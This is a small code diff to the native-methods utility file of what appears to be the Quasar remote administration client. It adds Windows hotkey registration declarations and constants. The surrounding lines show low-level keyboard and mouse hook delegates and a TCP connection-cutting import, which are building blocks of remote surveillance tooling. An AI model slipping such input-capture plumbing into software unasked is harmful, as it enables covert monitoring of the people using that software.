@@ -247,6 +247,12 @@ namespace Quasar.Client.Utilities
         [DllImport("iphlpapi.dll")]
         internal static extern int SetTcpEntry(IntPtr pTcprow);
 
+        [DllImport("user32.dll")]
+        internal static extern bool RegisterHotKey(IntPtr hWnd, int id, int fsModifiers, int vk);
+
+        [DllImport("user32.dll")]
+        internal static extern bool UnregisterHotKey(IntPtr hWnd, int id);
+
         public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
         public delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
 
@@ -299,5 +305,11 @@ namespace Quasar.Client.Utilities
             TcpTableOwnerModuleConnections,
             TcpTableOwnerModuleAll
         }
+
+        internal const int WM_HOTKEY = 0x0312;
+        internal const int MOD_ALT = 0x1;
+        internal const int MOD_CONTROL = 0x2;
+        internal const int MOD_SHIFT = 0x4;
+        internal const int MOD_WIN = 0x8;
     }
 }
